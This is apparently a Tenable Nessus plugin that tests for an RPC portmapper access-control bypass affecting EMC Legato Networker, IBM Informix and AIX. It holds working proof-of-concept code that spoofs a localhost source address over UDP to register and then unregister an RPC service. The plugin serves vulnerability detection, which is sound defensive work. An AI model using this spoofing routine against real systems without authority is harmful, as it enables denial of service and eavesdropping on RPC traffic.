#TRUSTED a27861c83967689336b59fc74e7e8ca01273629965d0a6fd6cadf48ab5d99e4b2b18f578c98d9a96bfea3f7aa8ab73792ca1dacebf27a161c60e1499569358fc846b533cbcf9b1829c39b83bcfcbe3e8d7ca7eadf97cc4ccb7e71e2ce9a3d75d9f1b116615c4055ddb6096e771cb4bbad4ab2cf7e71653190ed1851a2559ce9c5ef8c79bded8b77690d8f9d50ec7c8a6f879d2454f3587c3e8bcfc20af0eff0202f2fbfd0066b8d6e11da0d23e78add1c838e985c4ee80c83f7714d33f85f2d032a98339ef2c7e815d41f90f9f5cb7b73558d2ea53ae98ef714b5afa77b5ca3db1e9890ddfb874ceac303d9a2c7280fafb88efd4637c4b531613e3b26db0ace3ddac0959c2993e0a0bd2833ea19187dfacba3796d019d8b3eb91c61cec1ec4991dc370d44d845f30424b05096baf9c7fac6f5462275fa707fa7f276a984a0b0b9f4d8de38c38d6e8a04b77602a17c96338999828f35f4534f3ddd92e39dfdc47a93845478ad31580df91b286935cc6cb46c18ee77f13ffd70fa11b55380808dbe9dbf02af47e315edcfd3ee1f657fc086fa200147d9818ba8cc388d8b7cd0504fc9cffbfc1b74cfc24e9147e07bf44553fd6693469dfc511d221e27c8e54e9b6038b3d5daff476a6deb5b20ab323af68c73449e369fa40bc9669f508354c030f8d0262b782c24f55120b69d0a132808216780a0530f7e7e86fb99dc89c3c0d68
#TRUST-RSA-SHA256 ae98694b768b9950d67c366b87803288149f4e4a1a8c891a5d984bdd9aa11b9d5051bbcd0ea8918316d6e4bb81056a12b1dde7e28d7218abf54d748feeb7cfe22314d328f538d1662ce98cf5602c8e4e60175d5018dc248be1692d8e0998d2a6767385b9360263eff3d5c205a11a86362c509bb138f94eb7ebafc7a45fe5bb035ee499a7d0a04a35fed3e982aaeb7d7a715d411cf0a472f1457cc2078a406053ee381afe0aede91744fe598eb5d39913fc0ef6722f7032d1d7fd26240c792a1cc03b9c7f7639ce05967be4cc1ce592b6067af546b226b791cff43a06465160449d3e857f2d1f21ef4e810b0113375112125cd95f43e655a38cd33826bb500add28b53f5480a69e59e6901a4477af3f76129a5560cc4d0d5fadc4622d5b26927326c8cb1f466d499b901177743221d9376d582a79c6be78bb9a301b1d8227db0355b5ed52961cf3ba73b526e85b01ce9546fb92697f0d811101e75f47034f95a963048c4244f3d200f381ea93bf4a30c2baad266a0ad0078e4124d9e2df6d4d18340568b0c73af870ca9a08ba650a8a01b672ebb69406a8106d5ec04ad88be3eb3e4f26fa7f1a79085a3e4abc3e83f4d52fd3af66910890bf048e619aa5d69eb4b98a55401c4f1106ed07a7fe168515f2e62553a639ab6abbbcf1bfac5ca46e172e83580a10c7e9d74b8ef9891400d3fb99a4d8cf71c2f7f70c5cf7ccfbad7cb0
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(54586);
  script_version("1.16");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/21");

  script_cve_id("CVE-2011-0321", "CVE-2011-1210");
  script_bugtraq_id(46044, 47875);

  script_name(english:"Multiple Vendor RPC portmapper Access Restriction Bypass");

  script_set_attribute(attribute:"synopsis", value:
"The RPC portmapper on the remote host has an access restriction bypass
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The RPC portmapper running on the remote host (possibly included with
EMC Legato Networker, IBM Informix Dynamic Server, or AIX) has an
access restriction bypass vulnerability.

The service will only process pmap_set and pmap_unset requests that
have a source address of '127.0.0.1'.  Since communication is
performed via UDP, the source address can be spoofed, effectively
bypassing the verification process.  This allows remote,
unauthenticated attackers to register and unregister arbitrary RPC
services.

A remote attacker could exploit this to cause a denial of service or
eavesdrop on process communications.");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-11-168/");
  # http://web.archive.org/web/20121127215828/http://archives.neohapsis.com:80/archives/bugtraq/2011-01/att-0162/ESA-2011-003.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fca0dc65");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76179");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76177");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76178");
  script_set_attribute(attribute:"see_also", value:"https://aix.software.ibm.com/aix/efixes/security/rpc_advisory.asc");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant patch from the referenced documents for EMC Legato
Networker, IBM Informix Dynamic Server, or AIX.  If a different
application is being used, contact the vendor for a fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:informix");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:emc:legato_networker");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"RPC");

  script_copyright(english:"This script is Copyright (C) 2011-2023 Tenable Network Security, Inc.");

  script_dependencies("rpc_portmap.nasl", "rpcinfo.nasl");
  script_require_keys("Services/udp/rpc-portmapper");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("raw.inc");
include("sunrpc_func.inc");


PMAP_SET = 1;
PMAP_UNSET = 2;

# UDP port the portmapper is listening on
global_var portmap;

# info for the service we'll try to register
global_var port, prognum, versnum, proto;

##
# sends a pmap_set or pmap_unset (depending on 'proc')
# using a spoofed source address (localhost)
#
# exits if invalid argument provided to 'proc'
#
# @anonparam  proc  procedure (1 for set or 2 for unset)
##
function pmap_request()
{
  local_var proc, pmap_data, rpc_data, ip, udp, packet;
  proc = _FCT_ANON_ARGS[0];
  if (proc != PMAP_SET && proc != PMAP_UNSET)
    exit(1, "Unexpected procedure: " + proc);

  # this is the same for pmap_set and pmap_unset. pmap_unset ignores
  # the last two arguments, but they appear to be required anyway
  pmap_data =
    mkdword(prognum) +
    mkdword(versnum) +
    mkdword(proto) +
    mkdword(port);

  ip = ip(ip_dst:get_host_ip(), ip_src:'127.0.0.1', ip_p:IPPROTO_UDP);
  udp = udp(uh_dport:portmap, uh_sport:1000);
  rpc_data = rpc_packet(prog:100000, vers:2, proc:proc, data:pmap_data);
  packet = link_layer() + mkpacket(ip, udp, payload(rpc_data));
  inject_packet(packet:packet);
}

# plugin starts here

# make sure the PoC is only run once, in case there are
# multiple portmap services listening on the same host
portmappers = get_kb_list('Services/udp/rpc-portmapper');
if (isnull(portmappers)) exit(1, "The 'Services/udp/rpc-portmapper' KB item is missing.");
portmappers = sort(make_list(portmappers));
portmap = portmappers[0];

port = 12345;
prognum = 847883;  # 400111-200099999 = unassigned
versnum = 2;
proto = 6;  #TCP

# make sure to get TCP and UDP services
rpc_svcs = get_kb_list('Services*/rpc-*');

# make sure the program number of the service we'll attempt to register
# is not already registered
if (rpc_svcs)
{
  foreach key (keys(rpc_svcs))
  {
    match = eregmatch(string:key, pattern:'/rpc-(.+)$');
    if (isnull(match))  # this should always match unless something's horribly wrong
      exit(1, 'Unexpected error parsing "' + key + '".');
    else if (match[1] == prognum)
      exit(1, 'Program number '+prognum+' is already registered.');
  }
}

# first, try to register a new service
pmap_request(PMAP_SET);

# see if it was registered
res = get_rpc_port2(program:prognum, protocol:proto, portmap:portmap);

# then attempt to unregister it
pmap_request(PMAP_UNSET);

if (res == port)
  security_warning(port:portmap, proto:'udp');
else
  exit(1, 'Unable to determine if the service on UDP '+portmap+' is vulnerable.');

